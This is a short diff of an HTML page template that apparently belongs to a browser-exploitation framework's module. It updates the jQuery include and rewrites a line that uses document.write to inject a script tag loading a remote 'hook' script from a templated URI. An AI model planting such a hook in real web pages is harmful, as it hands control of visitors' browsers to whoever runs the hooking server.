@@ -14,7 +14,7 @@
 	<link rel="stylesheet" type="text/css" href="butch.css" />
 </head>
 <body>
-<script src="jquery-1.11.3.min.js"></script>
+<script src="jquery-1.12.4.min.js"></script>
 <script>
 
 	function showfriends() {
@@ -29,7 +29,7 @@
 
 </script>
 <script>
-	var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '<%= @hook_uri %>" type="text/javascript"><\/script>';
+	var commandModuleStr = '<script src="<%= @hook_uri %>" type="text/javascript"><\/script>';
 	document.write(commandModuleStr);
 </script>
 <div id="content">
